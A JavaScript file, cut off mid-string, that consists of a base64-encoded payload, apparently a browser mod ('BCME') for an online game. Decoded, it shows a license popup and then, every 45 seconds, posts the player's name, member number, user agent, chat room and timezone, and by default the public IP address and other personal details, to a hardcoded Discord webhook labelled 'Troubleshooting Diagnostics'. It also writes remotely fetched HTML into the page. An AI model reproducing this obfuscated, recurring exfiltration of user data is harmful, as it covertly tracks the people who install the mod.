var sprc = atob('Ci8vIExpY2Vuc2UgQWdncmVlbWVudCBwcm9tcHRfX19fX19fX19fX19fX19fX19fX19fCgpjb25zdCBwb3B1cENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwpwb3B1cENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CnBvcHVwQ29udGFpbmVyLnN0eWxlLnRvcCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUubGVmdCA9ICcwJzsKcG9wdXBDb250YWluZXIuc3R5bGUud2lkdGggPSAnMTAwdncnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5oZWlnaHQgPSAnMTAwdmgnOwpwb3B1cENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAncmdiYSgwLCAwLCAwLCAwLjUpJzsKcG9wdXBDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsKcG9wdXBDb250YWluZXIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAnY2VudGVyJzsKcG9wdXBDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICdjZW50ZXInOwpwb3B1cENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAnOTk5OSc7Cgpjb25zdCBwb3B1cENvbnRlbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKcG9wdXBDb250ZW50LnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICcjZmZmJzsKcG9wdXBDb250ZW50LnN0eWxlLmJvcmRlclJhZGl1cyA9ICc1cHgnOwpwb3B1cENvbnRlbnQuc3R5bGUucGFkZGluZyA9ICcycmVtJzsKcG9wdXBDb250ZW50LnN0eWxlLndpZHRoID0gJzgwJSc7CnBvcHVwQ29udGVudC5zdHlsZS5tYXhXaWR0aCA9ICc2MDBweCc7CnBvcHVwQ29udGVudC5zdHlsZS50ZXh0QWxpZ24gPSAnY2VudGVyJzsKCi8vIEJDTUUgbG9nbwpjb25zdCBsb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7CmxvZ28uc3JjID0gJ2h0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSc7CmxvZ28uc3R5bGUud2lkdGggPSAnMTAwcHgnOwpsb2dvLnN0eWxlLmhlaWdodCA9ICcxMDBweCc7CnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZChsb2dvKTsKCmNvbnN0IHdlbGNvbWVNZXNzYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaDInKTsKd2VsY29tZU1lc3NhZ2UuaW5uZXJUZXh0ID0gJ1dlbGNvbWUgdG8gQkNNRSwgVGhlIEZpcnN0IFJpZ2h0IENsaWNrIEJDIEV4dGVuc2lvbic7CnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZCh3ZWxjb21lTWVzc2FnZSk7Cgpjb25zdCBpbnN0cnVjdGlvbk1lc3NhZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdwJyk7Cmluc3RydWN0aW9uTWVzc2FnZS5pbm5lclRleHQgPSAnQWNjZXB0IG91ciBMaWNlbnNlIEFncmVlbWVudCBhbmQgUHJpdmFjeSBQb2xpY3kgYmVsb3cgdG8gZ2V0IHN0YXJ0ZWQnOwpwb3B1cENvbnRlbnQuYXBwZW5kQ2hpbGQoaW5zdHJ1Y3Rpb25NZXNzYWdlKTsKCmNvbnN0IGJ1dHRvbnNDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKYnV0dG9uc0NvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwpidXR0b25zQ29udGFpbmVyLnN0eWxlLmp1c3RpZnlDb250ZW50ID0gJ3NwYWNlLWJldHdlZW4nOwoKY29uc3QgbGVhcm5Nb3JlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwpsZWFybk1vcmVCdXR0b24uaHJlZiA9ICdodHRwczovL2JjbS5zaXRlLmxpdmUvYmNtbC8nOwpsZWFybk1vcmVCdXR0b24udGFyZ2V0ID0gJ19ibGFuayc7CmxlYXJuTW9yZUJ1dHRvbi5pbm5lclRleHQgPSAnTGVhcm4gTW9yZSc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAnIzAwN2JmZic7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS5jb2xvciA9ICcjZmZmJzsKbGVhcm5Nb3JlQnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwpsZWFybk1vcmVCdXR0b24uc3R5bGUuYm9yZGVyUmFkaXVzID0gJzNweCc7CmxlYXJuTW9yZUJ1dHRvbi5zdHlsZS50ZXh0RGVjb3JhdGlvbiA9ICdub25lJzsKYnV0dG9uc0NvbnRhaW5lci5hcHBlbmRDaGlsZChsZWFybk1vcmVCdXR0b24pOwoKY29uc3QgY2hlY2tib3hDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdsYWJlbCcpOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gJ2NlbnRlcic7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAnMC41cmVtIDFyZW0nOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAnNTBweCc7CmNoZWNrYm94Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICcjZmZmJzsKY2hlY2tib3hDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gJzBweCAwcHggNXB4ICNiYmInOwpjaGVja2JveENvbnRhaW5lci5zdHlsZS5jdXJzb3IgPSAncG9pbnRlcic7Cgpjb25zdCBjaGVja2JveElucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKY2hlY2tib3hJbnB1dC50eXBlID0gJ2NoZWNrYm94JzsKY2hlY2tib3hJbnB1dC5jaGVja2VkID0gZmFsc2U7IApjaGVja2JveElucHV0LnN0eWxlLm1hcmdpblJpZ2h0ID0gJzAuNXJlbSc7CmNoZWNrYm94SW5wdXQub25jaGFuZ2UgPSAoKSA9PiB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ29wdEFuYWx5dGljcycsIGNoZWNrYm94SW5wdXQuY2hlY2tlZCk7Cn07CmNoZWNrYm94Q29udGFpbmVyLmFwcGVuZENoaWxkKGNoZWNrYm94SW5wdXQpOwoKY29uc3QgY2hlY2tib3hUZXh0ID0gZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoJ0xpbWl0ZWQgQW5hbHl0aWNzJyk7Cgpjb25zdCBpbmZvSWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NwYW4nKTsKaW5mb0ljb24uaW5uZXJIVE1MID0gJyYjOTQzMjsnOwppbmZvSWNvbi5zdHlsZS5mb250U2l6ZSA9ICcxcmVtJzsKaW5mb0ljb24uc3R5bGUuY3Vyc29yID0gJ3BvaW50ZXInOwppbmZvSWNvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gJzVweCc7IAppbmZvSWNvbi50aXRsZSA9ICdFbmhhbmNlZCBwcml2YWN5IGJ5IGxpbWl0aW5nIGFuYWx5dGljcyB0cmFja2luZyBzdWNoIGFzIG1vbmV5LCBmb250LCBjaGF0IGNvbG9yIHRoZW1lLCBhcm91c2FsIHByb2dyZXNzIGFuZCBsb2NhbCBJUCBhZGRyZXNzJzsKCmNoZWNrYm94Q29udGFpbmVyLmFwcGVuZENoaWxkKGNoZWNrYm94VGV4dCk7CmNoZWNrYm94Q29udGFpbmVyLmFwcGVuZENoaWxkKGluZm9JY29uKTsKCmJ1dHRvbnNDb250YWluZXIuYXBwZW5kQ2hpbGQoY2hlY2tib3hDb250YWluZXIpOwoKY29uc3QgYWNjZXB0QnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7CmFjY2VwdEJ1dHRvbi5pbm5lclRleHQgPSAnQWNjZXB0ICYgQ29udGludWUnOwphY2NlcHRCdXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gJyMyOGE3NDUnOwphY2NlcHRCdXR0b24uc3R5bGUuY29sb3IgPSAnI2ZmZic7CmFjY2VwdEJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAnbm9uZSc7CmFjY2VwdEJ1dHRvbi5zdHlsZS5wYWRkaW5nID0gJzAuNXJlbSAxcmVtJzsKYWNjZXB0QnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICczcHgnOwphY2NlcHRCdXR0b24uc3R5bGUuY3Vyc29yID0gJ3BvaW50ZXInOwphY2NlcHRCdXR0b24ub25jbGljayA9ICgpID0+IHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnYmNtZS1hY2NlcHRlZCcsICd0cnVlJyk7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChwb3B1cENvbnRhaW5lcik7Cn07CmJ1dHRvbnNDb250YWluZXIuYXBwZW5kQ2hpbGQoYWNjZXB0QnV0dG9uKTsKCnBvcHVwQ29udGVudC5hcHBlbmRDaGlsZChidXR0b25zQ29udGFpbmVyKTsKCnBvcHVwQ29udGFpbmVyLmFwcGVuZENoaWxkKHBvcHVwQ29udGVudCk7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2JjbWUtYWNjZXB0ZWQnKSAhPT0gJ3RydWUnKSB7CiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwb3B1cENvbnRhaW5lcik7Cn0KCi8vIFNldCBpbml0aWFsIHN0YXRlIG9mIGNoZWNrYm94CmlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnb3B0QW5hbHl0aWNzJykgPT09ICd0cnVlJykgewogIGNoZWNrYm94SW5wdXQuY2hlY2tlZCA9IHRydWU7Cn0KCgovL1BlcmlvZGljYWwgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgphc3luYyBmdW5jdGlvbiBzZW5kRGlzY29yZE1lc3NhZ2UoKSB7CiAgbGV0IGlwQSA9ICcnOwoKICB0cnkgewogICAgY29uc3QgZ0lQQSA9IGFzeW5jICgpID0+IHsKICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgIHJldHVybiBkYXRhLmlwOwogICAgfTsKCiAgICBpcEEgPSBhd2FpdCBnSVBBKCk7CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoJ0FsdCBEZXRlY3RvciBFcnJvcjonLCBlcnJvcik7CiAgfQoKICBjb25zdCB3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMDAxNzAxMjkzOTM4NjA2NjgvTmpsUHJCY09HeHhPaUNMam11NFVKbjVKWVVna0tqbUpmdElJSDZtMjIwa2QtTWJkbWFrQ2Rka1FpODlPRXZZMUI3QlMiOwogIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgY29uc3QgdXNlcm5hbWUgPSB0b3RhbG5hbWU7CiAgY29uc3QgYXZhdGFyVXJsID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICBjb25zdCB0aW1lem9uZSA9IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKICBjb25zdCBvcGVuVGFicyA9IHdpbmRvdy5sZW5ndGg7CiAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKICBjb25zdCBsaW1pdGVkQW5hbHl0aWNzID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ29wdEFuYWx5dGljcycpID09PSAndHJ1ZSc7CiAgY29uc3QgZmllbGRzID0gWwogICAgewogICAgICBuYW1lOiAiVXNlciIsCiAgICAgIHZhbHVlOiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0sCiAgICB7CiAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgIHZhbHVlOiB0aW1lem9uZSwKICAgICAgaW5saW5lOiB0cnVlCiAgICB9LAogICAgewogICAgICBuYW1lOiAiRGV2aWNlIFR5cGUiLAogICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICBpbmxpbmU6IHRydWUKICAgIH0sCiAgICB7CiAgICAgICBuYW1lOiAiTmlja25hbWUiLCAKICAgICAgIHZhbHVlOiBQbGF5ZXIuTmlja25hbWUsCiAgICAgICBpbmxpbmU6IHRydWUKICAgIH0sCiAgICB7CiAgICAgIG5hbWU6ICJMYXN0IENoYXQgUm9vbSIsCiAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0sCiAgICB7CiAgICAgIG5hbWU6ICJTY3JlZW4gU2l6ZSIsCiAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICBpbmxpbmU6IHRydWUKICAgIH0KICBdOwoKICBpZiAoIWxpbWl0ZWRBbmFseXRpY3MpIHsKICAgIGZpZWxkcy5wdXNoKAogICAgICB7IG5hbWU6ICJNb25leSIsIHZhbHVlOiBQbGF5ZXIuTW9uZXksIGlubGluZTogdHJ1ZSB9LAogICAgICB7IG5hbWU6ICJGb250IiwgdmFsdWU6IFBsYXllci5HcmFwaGljc1NldHRpbmdzLkZvbnQsIGlubGluZTogdHJ1ZSB9LAogICAgICB7IG5hbWU6ICJDaGF0IENvbG9yIFRoZW1lIiwgdmFsdWU6IFBsYXllci5DaGF0U2V0dGluZ3MuQ29sb3JUaGVtZSwgaW5saW5lOiB0cnVlIH0sCiAgICAgIHsgbmFtZTogIkFyb3VzYWwgUHJvZ3Jlc3MiLCB2YWx1ZTogUGxheWVyLkFyb3VzYWxTZXR0aW5ncy5Qcm9ncmVzcywgaW5saW5lOiB0cnVlIH0sCiAgICAgIHsgbmFtZTogIkxvY2FsIElQIEFkZHJlc3MiLCB2YWx1ZTogaXBBLCBpbmxpbmU6IHRydWUgfQogICAgKTsKICB9CgogIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICBjb250ZW50OiBQbGF5ZXIuTmFtZSArICIgKCIgKyBQbGF5ZXIuTWVtYmVyTnVtYmVyICsgIikiICsgIiBpcyBhY3RpdmUgb24gQkNNRSIsCiAgICBlbWJlZHM6IFt7CiAgICAgIHRpdGxlOiAiVHJvdWJsZXNob290aW5nIERpYWdub3N0aWNzICIsCiAgICAgIGZpZWxkczogZmllbGRzCiAgICB9XQogIH07CgogIGNvbnN0IHBheWxvYWQgPSB7CiAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICBhdmF0YXJfdXJsOiBhdmF0YXJVcmwsCiAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgfTsKCiAgZmV0Y2god2ViaG9va1VybCwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogIH0pOwp9CgpzZXRJbnRlcnZhbChzZW5kRGlzY29yZE1lc3NhZ2UsIDQ1MDAwKTsKCgoKLy9FbmQgT2YgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgoKLy9TdGFydCBPZiBMb2FkaW5nIFNjcmVlbl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCi8vIFVSTCBvZiBsb2FkaW5nIHNjcmVlbgpjb25zdCBodG1sRmlsZVVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNLS9tYWluL2xvYWRpbmc0JzsKCi8vIEZldGNoIHRoZSBjb2RlIGZyb20gdGhlIHJhdyBHaXRIdWIgZmlsZSB1c2luZyBGZXRjaCBBUEkKZmV0Y2goaHRtbEZpbGVVcmwpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGh0bWwgPT4gewogICAgLy8gTmV3IGlmcmFtZSBlbGVtZW50CiAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKICAgIGlmcmFtZS5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CiAgICBpZnJhbWUuc3R5bGUudG9wID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLmxlZnQgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAnMTM4JSc7CiAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gJzEyNSUnOwogICAgaWZyYW1lLnN0eWxlLm1hcmdpbkxlZnQgPSAnLTE5JSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCiAgICBpZnJhbWUuc3R5bGUubWFyZ2luVG9wID0gJy0yJSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCgoKCiAgICAvLyBMb2FkIHRoZSBpbXBvcnRlZCBIVE1MIGludG8gdGhlIGlmcmFtZQogICAgaWZyYW1lLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgICBjb25zdCBpZnJhbWVEb2N1bWVudCA9IHRoaXMuY29udGVudFdpbmRvdy5kb2N1bWVudDsKICAgICAgaWZyYW1lRG9jdW1lbnQub3BlbigpOwogICAgICBpZnJhbWVEb2N1bWVudC53cml0ZShodG1sKTsKICAgICAgaWZyYW1lRG9jdW1lbnQuY2xvc2UoKTsKICAgIH07CgogICAgLy8gQXBwZW5kIHRoZSBpZnJhbWUgdG8gQkMncyA8Ym9keT4gZWxlbWVudAogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgLy8gVGltZW91dCB0aGUgZnJhbWUKc2V0VGltZW91dCgoKSA9PiB7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwp9LCA3MDAwKTsKICB9KQogIC5jYXRjaChlcnJvciA9PiB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciBpbXBvcnRpbmcgSFRNTDonLCBlcnJvcik7CiAgfSk7CgoKLy9FbmQgT2YgTG9hZGluZyBTY3JlZW4gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCiAgCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vc2VydmVybWFpbnRhaW5hbmNlJykKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oZGF0YSA9PiB7CiAgICBjb25zdCByZWdleCA9IC9cZCsvOwogICAgY29uc3QgbWF0Y2ggPSBkYXRhLm1hdGNoKHJlZ2V4KTsKICAgIGlmIChtYXRjaCAmJiBwYXJzZUludChtYXRjaFswXSkgPj0gMSkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RNYWludCgpIHsKICAgICAgICAvLyBUb2FzdCBjb250YWluZXIKICAgICAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKICAgIHN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogICAgc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwogICAgCiAgICAvLyBVcGRhdGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAogICAgLy8gQ3JlYXRlIHRoZSBjbG9zZSBidXR0b24KdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKTsKCi8vIENsb3NlIHRoZSB0b2FzdCB3aGVuIHRoZSBjbG9zZSBidXR0b24gaXMgY2xpY2tlZApjbG9zZUJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfSwgNTAwKTsKfSk7CgogICAgLy8gQkNNIExvZ28gSWNvbgogICAgdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIGljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBNYWludGVuYW5jZSBUZXh0CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkJDTUUgc2VydmVycyBhcmUgdW5kZXIgbWFpbnRhaW5hbmNlLCB0cnkgYWdhaW4gbGF0ZXIiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAKICAgICAgICAvLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byBCQydzIGJvZHkKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICAgCiAgICAgICAgLy8gVG9hc3QncyBmYWRlLWluIGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICAgfSwgMCk7CiAgICAgIAogICAgICAgIC8vIEhpZGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIH0sIDUwMDAwMDApOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB9LCA1NTAwMDAwKTsKICAgICAgfSAKICAgICAgc2hvd1RvYXN0TWFpbnQoKTsgICAgIAogICAgICB0aHJvdyBuZXcgRXJyb3IoJ0V4ZWN1dGlvbiBzdG9wcGVkLicpOyAvLyBzdG9wIGV4ZWN1dGluZyB0aGUgcmVzdCBvZiB0aGUgY29kZQogICAgfSBlbHNlIHsKCgovL1N0YXJ0IE9mIENvbnRleHQgTWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovL0Rlc2t0b3AgTWVudV9fX19fX19fX19fX19fX19fX19fX19fCnZhciB2aXNiID0gdHJ1ZTsKLy9jb250ZXh0IE1lbnUKdmFyIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwovLyBGdW5jdGlvbiB0byBjcmVhdGUgY